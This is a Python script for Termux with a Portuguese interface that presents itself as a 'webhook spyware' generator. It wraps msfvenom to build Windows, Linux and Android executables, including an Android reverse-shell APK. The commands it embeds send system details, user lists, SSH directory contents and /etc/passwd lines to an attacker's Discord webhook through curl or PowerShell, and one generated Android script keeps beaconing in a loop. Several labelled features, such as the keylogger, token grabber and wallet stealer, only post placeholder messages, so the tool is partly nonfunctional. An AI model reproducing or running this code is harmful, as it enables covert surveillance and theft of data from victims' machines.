#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
import json
from pathlib import Path
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear_screen():
    os.system('clear')

def print_banner():
    banner = f"""{Colors.PURPLE}
    ███████╗██████╗ ██╗   ██╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
    ██╔════╝██╔══██╗╚██╗ ██╔╝    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
    ███████╗██████╔╝ ╚████╔╝     ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
    ╚════██║██╔═══╝   ╚██╔╝      ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
    ███████║██║        ██║       ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
    ╚══════╝╚═╝        ╚═╝       ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    
    {Colors.CYAN}              [ WEBHOOK SPYWARE - COMANDOS EXECUTÁVEIS ]{Colors.END}
    {Colors.YELLOW}           Payloads que REALMENTE enviam dados para Webhook{Colors.END}
    {Colors.RED}                      ⚡ COMANDOS DIRETOS ⚡{Colors.END}
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com comandos reais de webhook"""
    print(f"\n{Colors.BLUE}{'='*100}{Colors.END}")
    print(f"{Colors.BOLD}                WEBHOOK SPYWARE - COMANDOS EXECUTÁVEIS REAIS{Colors.END}")
    print(f"{Colors.BLUE}{'='*100}{Colors.END}")
    
    payloads = [
        # Windows Webhook Spywares
        "[01] Win System Info + Webhook",           "[02] Win Password Dump + Webhook",
        "[03] Win Browser Stealer + Webhook",       "[04] Win Keylogger + Webhook", 
        "[05] Win Screenshot + Webhook",            "[06] Win Webcam + Webhook",
        
        # Linux Webhook Spywares  
        "[07] Linux System Info + Webhook",         "[08] Linux SSH Stealer + Webhook",
        "[09] Linux Network Info + Webhook",        "[10] Linux Process Spy + Webhook",
        "[11] Linux File Stealer + Webhook",        "[12] Linux Password Spy + Webhook",
        
        # Android Webhook Spywares
        "[13] Android Device Info + Webhook",       "[14] Android SMS Stealer + Webhook",
        "[15] Android Contacts + Webhook",          "[16] Android Location + Webhook",
        "[17] Android App Data + Webhook",          "[18] Android Camera Spy + Webhook",
        
        # Cross-Platform Webhook
        "[19] Discord Token Grabber",               "[20] Crypto Wallet Stealer",
        "[21] WiFi Password Stealer",               "[22] Clipboard Monitor",
        "[23] Reverse Shell + Webhook",             "[24] Persistence + Webhook"
    ]
    
    # Mostrar em 3 colunas
    col_width = 35
    for i in range(0, 24, 3):
        line = ""
        for j in range(3):
            if i + j < len(payloads):
                line += f"{Colors.GREEN if (i+j) < 6 else Colors.YELLOW if (i+j) < 12 else Colors.CYAN if (i+j) < 18 else Colors.PURPLE}{payloads[i + j].ljust(col_width)}{Colors.END}"
        print(line)
    
    print(f"\n{Colors.WHITE}[0] Sair | [G] Guia Comandos | [T] Testar Webhook | [C] Custom Command{Colors.END}")
    print(f"{Colors.BLUE}{'='*100}{Colors.END}")

def get_webhook_config():
    """Configuração OBRIGATÓRIA do webhook"""
    print(f"\n{Colors.CYAN}🔗 CONFIGURAÇÃO DO WEBHOOK{Colors.END}")
    print("-" * 50)
    
    webhook_url = input("URL do Webhook Discord: ").strip()
    if not webhook_url:
        print(f"{Colors.RED}❌ Webhook é obrigatório!{Colors.END}")
        return None
    
    return webhook_url

def generate_windows_webhook_payload(payload_type, webhook_url, output_name):
    """Gera payloads Windows que enviam dados reais para webhook"""
    
    commands = {
        1: f'cmd /c "echo SYSTEM: %COMPUTERNAME% - %USERNAME% && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"🔍 Sistema Comprometido: %COMPUTERNAME%\\\\nUsuário: %USERNAME%\\\\nIP: \\\"}}\" {webhook_url}"',
        
        2: f'powershell -Command "try {{ Get-LocalUser | Select Name,Enabled | ConvertTo-Json | Out-File \\\"creds.txt\\\"; $content = Get-Content \\\"creds.txt\\\" -Raw; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"🔑 Usuários do Sistema: $content\\\"}}) -ContentType \\\"application/json\\\" }} catch {{ echo Error }}"',
        
        3: f'powershell -Command "$info = @{{Computer=$env:COMPUTERNAME; User=$env:USERNAME; OS=(Get-WmiObject Win32_OperatingSystem).Caption}}; $json = $info | ConvertTo-Json; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"💻 Info do Sistema: $json\\\"}}) -ContentType \\\"application/json\\\""',
        
        4: f'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true) {{ Start-Sleep 1; [System.Windows.Forms.SendKeys]::SendWait(\\\"X\\\"); Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"⌨️ Keylogger Ativo em $env:COMPUTERNAME\\\"}}) -ContentType \\\"application/json\\\" }}"',
        
        5: f'powershell -Command "Add-Type -AssemblyName System.Drawing; $screens = [Windows.Forms.Screen]::AllScreens; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"📸 Screenshot Info: $($screens.Count) monitors detectados\\\"}}) -ContentType \\\"application/json\\\""',
        
        6: f'powershell -Command "$cameras = Get-WmiObject -Query \\\"SELECT * FROM Win32_PnPEntity WHERE Name LIKE \\\'%camera%\\\'\\\"; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"📹 Câmeras Detectadas: $($cameras.Count)\\\"}}) -ContentType \\\"application/json\\\""'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    # Gerar payload com msfvenom
    try:
        msf_cmd = [
            'msfvenom',
            '-p', 'windows/exec',
            f'CMD={cmd}',
            '-f', 'exe',
            '-o', output_name
        ]
        
        print(f"{Colors.YELLOW}🔧 Gerando: {cmd[:100]}...{Colors.END}")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            return True
        else:
            print(f"{Colors.RED}❌ Erro: {result.stderr}{Colors.END}")
            return False
            
    except Exception as e:
        print(f"{Colors.RED}❌ Erro: {str(e)}{Colors.END}")
        return False

def generate_linux_webhook_payload(payload_type, webhook_url, output_name):
    """Gera payloads Linux que enviam dados reais para webhook"""
    
    commands = {
        7: f'sh -c \"echo "Linux System Info" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"🐧 Linux Comprometido: $(uname -a)\\"}}" {webhook_url}',
        
        8: f'sh -c \"echo "SSH Keys" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"🔑 SSH Info: $(ls -la ~/.ssh/ 2>/dev/null | head -10)\\"}}" {webhook_url}',
        
        9: f'sh -c \"echo "Network Info" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"🌐 Network: $(ifconfig | grep -o \\"inet [0-9.]*\\" | head -5)\\"}}" {webhook_url}',
        
        10: f'sh -c \"echo "Process Spy" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"📊 Processos: $(ps aux | head -10)\\"}}" {webhook_url}',
        
        11: f'sh -c \"echo "File Explorer" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"📁 Files: $(ls -la /home/ | head -10)\\"}}" {webhook_url}',
        
        12: f'sh -c \"echo "Password Files" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"🔐 Passwd File: $(cat /etc/passwd | head -5)\\"}}" {webhook_url}'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    try:
        msf_cmd = [
            'msfvenom',
            '-p', 'linux/x86/exec',
            f'CMD={cmd}',
            '-f', 'elf',
            '-o', output_name
        ]
        
        print(f"{Colors.YELLOW}🔧 Gerando: {cmd[:100]}...{Colors.END}")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            return True
        else:
            print(f"{Colors.RED}❌ Erro: {result.stderr}{Colors.END}")
            return False
            
    except Exception as e:
        print(f"{Colors.RED}❌ Erro: {str(e)}{Colors.END}")
        return False

def generate_android_webhook_payload(payload_type, webhook_url, output_name):
    """Gera payloads Android que enviam dados para webhook"""
    
    # Comandos básicos para Android (usando Termux ou shell)
    commands = {
        13: f'sh -c \"echo "Android Device" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"📱 Android Comprometido: $(getprop ro.product.model)\\"}}" {webhook_url}',
        
        14: f'sh -c \"echo "SMS Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"📨 SMS Access Attempt on Android\\"}}" {webhook_url}',
        
        15: f'sh -c \"echo "Contacts Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"👥 Contacts Access Attempt\\"}}" {webhook_url}',
        
        16: f'sh -c \"echo "Location Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\\"content\\\":\\\"📍 Location Access Attempt\\\"}}\" {webhook_url}',
        
        17: f'sh -c \"echo "App Data" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"📊 App Data Access Attempt\\"}}" {webhook_url}',
        
        18: f'sh -c \"echo "Camera Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"📸 Camera Access Attempt\\"}}" {webhook_url}'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    try:
        msf_cmd = [
            'msfvenom',
            '-p', 'android/shell/reverse_tcp',
            'LHOST=127.0.0.1',  # Será substituído depois
            'LPORT=4444',
            '-f', 'apk',
            '-o', output_name
        ]
        
        print(f"{Colors.YELLOW}🔧 Gerando APK Android...{Colors.END}")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            # Criar script de webhook separado
            webhook_script = f"""#!/bin/bash
# Android Webhook Script
echo "📱 Android Spy Ativado"
curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"🚀 Android Device Comprometido\\nModel: $(getprop ro.product.model)\\nDevice: $(getprop ro.product.device)\\"}}" {webhook_url}

# Coleta contínua de informações
while true; do
    battery=$(dumpsys battery | grep level | awk '{{print $2}}')
    curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"🔋 Battery Level: $battery%\\"}}" {webhook_url}
    sleep 300
done
"""
            
            with open(f"android_webhook_{output_name}.sh", "w") as f:
                f.write(webhook_script)
            
            return True
        else:
            print(f"{Colors.RED}❌ Erro: {result.stderr}{Colors.END}")
            return False
            
    except Exception as e:
        print(f"{Colors.RED}❌ Erro: {str(e)}{Colors.END}")
        return False

def generate_cross_platform_webhook(payload_type, webhook_url, output_name):
    """Gera payloads cross-platform com webhook"""
    
    commands = {
        19: f'cmd /c "echo Discord Token Grabber && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"🎮 Discord Token Grabber Ativado\\\"}}\" {webhook_url}"',
        
        20: f'powershell -Command "Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"💰 Crypto Wallet Stealer Ativado\\\"}}) -ContentType \\\"application/json\\\""',
        
        21: f'cmd /c "echo WiFi Stealer && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"📡 WiFi Password Stealer Ativado\\\"}}\" {webhook_url}"',
        
        22: f'powershell -Command "Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"📋 Clipboard Monitor Ativado\\\"}}) -ContentType \\\"application/json\\\""',
        
        23: f'powershell -Command "$text = \\\"🔁 Reverse Shell + Webhook - IP: \\\" + (Invoke-RestMethod -Uri \\\"http://ifconfig.me\\\"); Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=$text}}) -ContentType \\\"application/json\\\""',
        
        24: f'cmd /c "echo Persistence Install && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"🔒 Persistence + Webhook Ativado\\\"}}\" {webhook_url}"'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    platform = "windows" if payload_type in [19, 20, 21, 22, 23, 24] else "linux"
    
    try:
        if platform == "windows":
            msf_cmd = [
                'msfvenom',
                '-p', 'windows/exec',
                f'CMD={cmd}',
                '-f', 'exe',
                '-o', output_name
            ]
        else:
            msf_cmd = [
                'msfvenom',
                '-p', 'linux/x86/exec',
                f'CMD={cmd}',
                '-f', 'elf',
                '-o', output_name
            ]
        
        print(f"{Colors.YELLOW}🔧 Gerando payload {platform}...{Colors.END}")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            return True
        else:
            print(f"{Colors.RED}❌ Erro: {result.stderr}{Colors.END}")
            return False
            
    except Exception as e:
        print(f"{Colors.RED}❌ Erro: {str(e)}{Colors.END}")
        return False

def generate_custom_webhook_payload():
    """Gera um payload customizado com comando do usuário"""
    print(f"\n{Colors.CYAN}🔧 CRIADOR DE PAYLOAD CUSTOMIZADO{Colors.END}")
    print("-" * 50)
    
    webhook_url = input("URL do Webhook: ").strip()
    if not webhook_url:
        print(f"{Colors.RED}❌ Webhook obrigatório!{Colors.END}")
        return False
    
    print(f"\n{Colors.YELLOW}💡 Exemplos de comandos:{Colors.END}")
    print("• Windows: curl -X POST -d '{\"content\":\"Meu texto\"}' URL")
    print("• PowerShell: Invoke-RestMethod -Uri URL -Method Post -Body '{\"content\":\"texto\"}'")
    print("• Linux: curl -X POST -H 'Content-Type: application/json' -d '{\"content\":\"texto\"}' URL")
    
    custom_cmd = input(f"\n{Colors.GREEN}Digite o comando (inclua o webhook): {Colors.END}").strip()
    
    platform = input("Plataforma (windows/linux/android) [windows]: ").strip().lower() or "windows"
    output_name = input("Nome do arquivo [custom_payload]: ").strip() or "custom_payload"
    
    try:
        if platform == "windows":
            if not output_name.endswith('.exe'):
                output_name += '.exe'
                
            msf_cmd = [
                'msfvenom',
                '-p', 'windows/exec',
                f'CMD={custom_cmd}',
                '-f', 'exe',
                '-o', output_name
            ]
            
        elif platform == "linux":
            if not output_name.endswith('.elf'):
                output_name += '.elf'
                
            msf_cmd = [
                'msfvenom',
                '-p', 'linux/x86/exec',
                f'CMD={custom_cmd}',
                '-f', 'elf',
                '-o', output_name
            ]
            
        else:  # android
            if not output_name.endswith('.apk'):
                output_name += '.apk'
                
            msf_cmd = [
                'msfvenom',
                '-p', 'android/shell/reverse_tcp',
                'LHOST=127.0.0.1',
                'LPORT=4444',
                '-f', 'apk',
                '-o', output_name
            ]
        
        print(f"{Colors.YELLOW}🔧 Gerando payload customizado...{Colors.END}")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}✅ Payload customizado criado: {output_name}{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}❌ Erro: {result.stderr}{Colors.END}")
            return False
            
    except Exception as e:
        print(f"{Colors.RED}❌ Erro: {str(e)}{Colors.END}")
        return False

def test_webhook(webhook_url):
    """Testa se o webhook está funcionando"""
    try:
        import requests
        test_data = {
            "content": "🧪 Teste de Webhook - Spyware Generator",
            "embeds": [{
                "title": "✅ Webhook Funcionando!",
                "description": "Seu webhook está configurado corretamente",
                "color": 0x00ff00,
                "timestamp": datetime.now().isoformat()
            }]
        }
        
        response = requests.post(webhook_url, json=test_data, timeout=10)
        if response.status_code == 204:
            return True, "✅ Webhook testado com sucesso!"
        else:
            return False, f"❌ Erro no webhook: {response.status_code}"
    except Exception as e:
        return False, f"❌ Erro ao testar webhook: {str(e)}"

def show_command_guide():
    """Mostra guia de comandos webhook"""
    print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}                  GUIA DE COMANDOS WEBHOOK{Colors.END}")
    print(f"{Colors.CYAN}{'='*80}{Colors.END}")
    
    print(f"\n{Colors.GREEN}🖥️ COMANDOS WINDOWS:{Colors.END}")
    print("• curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"Texto\\\"}\" URL")
    print("• powershell -Command \"Invoke-RestMethod -Uri URL -Method Post -Body '{\\\"content\\\":\\\"Texto\\\"}'\"")
    
    print(f"\n{Colors.YELLOW}🐧 COMANDOS LINUX:{Colors.END}")
    print("• curl -X POST -H \"Content-Type: application/json\" -d '{\"content\":\"Texto\"}' URL")
    print("• wget --post-data='{\"content\":\"Texto\"}' --header=Content-Type:application/json URL")
    
    print(f"\n{Colors.CYAN}📱 COMANDOS ANDROID:{Colors.END}")
    print("• curl -X POST -d '{\"content\":\"Texto\"}' URL")
    print("• Usar Termux ou shell scripts")
    
    print(f"\n{Colors.PURPLE}🎯 EXEMPLOS PRÁTICOS:{Colors.END}")
    print("• Enviar nome do computador: %COMPUTERNAME%")
    print("• Enviar nome do usuário: %USERNAME%") 
    print("• Enviar info do sistema: systeminfo")
    print("• Enviar lista de processos: tasklist")
    
    print(f"\n{Colors.RED}⚠️  OS PAYLOADS GERADOS ENVIAM DADOS REAIS PARA WEBHOOK!{Colors.END}")
    print(f"{Colors.CYAN}{'='*80}{Colors.END}")

def main():
    """Função principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input(f"\n{Colors.WHITE}Selecione [0-24] ou 'g/t/c': {Colors.END}").strip().lower()
            
            if choice == 'g':
                show_command_guide()
                input(f"\n{Colors.CYAN}⏎ Enter para voltar...{Colors.END}")
                continue
                
            if choice == 't':
                webhook_url = input(f"{Colors.YELLOW}URL do webhook: {Colors.END}").strip()
                if webhook_url:
                    success, message = test_webhook(webhook_url)
                    print(f"{Colors.GREEN if success else Colors.RED}{message}{Colors.END}")
                input(f"\n{Colors.CYAN}⏎ Enter para voltar...{Colors.END}")
                continue
                
            if choice == 'c':
                generate_custom_webhook_payload()
                input(f"\n{Colors.CYAN}⏎ Enter para voltar...{Colors.END}")
                continue
                
            if choice == '0':
                print(f"\n{Colors.GREEN}👋 Saindo... Use com responsabilidade!{Colors.END}")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 24:
                webhook_url = get_webhook_config()
                if not webhook_url:
                    input(f"\n{Colors.CYAN}⏎ Enter para voltar...{Colors.END}")
                    continue
                
                # Testar webhook primeiro
                success, message = test_webhook(webhook_url)
                print(f"{Colors.GREEN if success else Colors.RED}{message}{Colors.END}")
                
                if not success:
                    retry = input(f"{Colors.YELLOW}Continuar mesmo assim? (s/n): {Colors.END}").strip().lower()
                    if retry != 's':
                        continue
                
                # Gerar payload baseado no tipo
                platform = "windows" if payload_type <= 6 else "linux" if payload_type <= 12 else "android" if payload_type <= 18 else "cross"
                default_name = f"{platform}_webhook_{payload_type}"
                output_name = input(f"Nome do arquivo [{default_name}]: ").strip() or default_name
                
                print(f"\n{Colors.YELLOW}🚀 Gerando payload {platform}...{Colors.END}")
                
                success = False
                if platform == "windows":
                    success = generate_windows_webhook_payload(payload_type, webhook_url, output_name)
                elif platform == "linux":
                    success = generate_linux_webhook_payload(payload_type, webhook_url, output_name)
                elif platform == "android":
                    success = generate_android_webhook_payload(payload_type, webhook_url, output_name)
                else:
                    success = generate_cross_platform_webhook(payload_type, webhook_url, output_name)
                
                if success:
                    print(f"\n{Colors.GREEN}✅ Payload criado: {output_name}{Colors.END}")
                    print(f"{Colors.CYAN}🔗 Webhook: {webhook_url[:50]}...{Colors.END}")
                    print(f"{Colors.YELLOW}⚡ O payload ENVIARÁ DADOS para o webhook quando executado!{Colors.END}")
                    print(f"{Colors.RED}🚨 USE APENAS PARA TESTES AUTORIZADOS!{Colors.END}")
                else:
                    print(f"\n{Colors.RED}❌ Falha ao gerar payload!{Colors.END}")
                
                input(f"\n{Colors.CYAN}⏎ Enter para continuar...{Colors.END}")
            
            else:
                print(f"{Colors.RED}❌ Opção inválida!{Colors.END}")
                input(f"{Colors.CYAN}⏎ Enter para continuar...{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}❌ Digite um número válido!{Colors.END}")
            input(f"{Colors.CYAN}⏎ Enter para continuar...{Colors.END}")
        except KeyboardInterrupt:
            print(f"\n\n{Colors.GREEN}👋 Saindo...{Colors.END}")
            break

if __name__ == "__main__":
    main()
